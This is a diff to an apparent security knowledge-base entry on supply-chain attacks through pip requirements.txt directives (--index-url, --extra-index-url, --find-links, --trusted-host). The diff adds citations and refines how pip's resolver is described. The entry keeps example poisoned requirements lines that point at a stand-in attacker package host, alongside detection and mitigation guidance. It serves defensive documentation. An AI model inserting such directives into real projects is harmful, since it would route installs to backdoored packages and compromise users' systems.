@@ -9,14 +9,17 @@ platform:
   - "macOS"
   - "Windows"
 description: "pip's requirements.txt file format supports global options including --index-url, --extra-index-url, --find-links, and --trusted-host directives that control where packages are downloaded from and how TLS verification is handled. An attacker who can modify a project's requirements.txt (via supply chain compromise, malicious pull request, or repository access) can redirect all package downloads to an attacker-controlled index server hosting trojanized packages. These directives are processed silently by pip with no user confirmation, and developers rarely audit requirements files for URL-based directives beyond package names."
+descriptionCitations: [1, 2, 3, 4, 5]
 prerequisites:
   - "Attacker has write access to the project's requirements.txt or can submit changes via pull request"
   - "The target project installs dependencies using pip install -r requirements.txt"
   - "Developers or CI/CD pipelines do not audit requirements files for URL directives"
   - "Attacker hosts a malicious PyPI-compatible index server with trojanized packages"
+prerequisitesCitations: [1, 2, 3, 4, 5]
 attackScenarios:
   - title: "Injecting --index-url to redirect all downloads"
     description: "The attacker adds an --index-url directive to requirements.txt that replaces the default PyPI URL with an attacker-controlled server. All subsequent package installations from this file are served by the malicious index, which hosts backdoored versions of every requested package."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - label: "Poisoned requirements.txt with malicious index URL"
         code: |
@@ -35,14 +38,15 @@ attackScenarios:
           # The attacker's server mirrors real packages but with injected payloads
         language: "python"
   - title: "Using --extra-index-url for selective package hijacking"
-    description: "The attacker adds --extra-index-url to inject an additional package source. pip searches both PyPI and the attacker's index, selecting the highest version. The attacker hosts higher-versioned backdoored copies of specific targeted packages while letting other packages resolve from legitimate PyPI."
+    description: "The attacker adds --extra-index-url to inject an additional package source. pip gives the locations no priority, combines their candidates, and selects the best match for each requirement. A higher compatible attacker version can therefore be preferred for an unpinned requirement, while other packages still resolve from PyPI."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - label: "requirements.txt with extra index URL injection"
         code: |
           # requirements.txt
           --extra-index-url https://packages.attacker.example.com/simple/
 
-          # These will resolve from whichever index has the highest version
+          # Candidates from both indexes compete under pip's resolver rules
           flask==2.3.2
           requests==2.31.0
           boto3>=1.28.0  # Unpinned - attacker serves 99.0.0 from malicious index
@@ -50,6 +54,7 @@ attackScenarios:
         language: "python"
   - title: "Using --find-links for local or remote package injection"
     description: "The --find-links directive tells pip to look for packages at a specific URL or filesystem path in addition to the configured index. An attacker can point this to a directory or web server hosting malicious wheel files."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - label: "requirements.txt with --find-links injection"
         code: |
@@ -63,6 +68,7 @@ attackScenarios:
         language: "python"
   - title: "Disabling TLS verification with --trusted-host"
     description: "The --trusted-host directive disables SSL certificate verification for a specified host, enabling man-in-the-middle attacks. Combined with --index-url, an attacker can intercept and modify package downloads in transit."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - label: "requirements.txt disabling TLS verification"
         code: |
@@ -81,6 +87,7 @@ attackScenarios:
 detection:
   - title: "Audit requirements files for URL directives"
     description: "Search all requirements files in the repository for pip global options that control package sources. These directives should be flagged for manual review and ideally prohibited in favor of pip.conf or CI/CD-level configuration."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - code: |
           # Search for dangerous directives in all requirements files
@@ -95,6 +102,7 @@ detection:
         language: "bash"
   - title: "Implement pre-commit hooks to catch requirements manipulation"
     description: "Use pre-commit hooks or CI/CD checks that scan requirements files for unauthorized URL directives before changes are merged."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - code: |
           # .pre-commit-config.yaml entry for scanning requirements files
@@ -131,6 +139,7 @@ mitigation:
   - "Pin all dependencies to exact versions with --require-hashes to prevent substitution regardless of index"
   - "Code review all changes to requirements files, treating URL directive additions as security-critical changes"
   - "Use a lockfile tool (pip-tools, poetry, pdm) that separates dependency specification from resolution"
+mitigationCitations: [1, 2, 3, 4, 5]
 references:
   - title: "pip documentation - Requirements File Format"
     url: "https://pip.pypa.io/en/stable/reference/requirements-file-format/"
@@ -140,6 +149,8 @@ references:
     url: "https://owasp.org/www-project-dependency-check/"
   - title: "Python Security Best Practices Cheat Sheet"
     url: "https://snyk.io/blog/python-security-best-practices-cheat-sheet/"
+  - title: "pip install - Package Index Options"
+    url: "https://pip.pypa.io/en/stable/cli/pip_install/#package-index-options"
 created: 2026-04-02
-updated: 2026-04-02
+updated: 2026-10-14
 ---
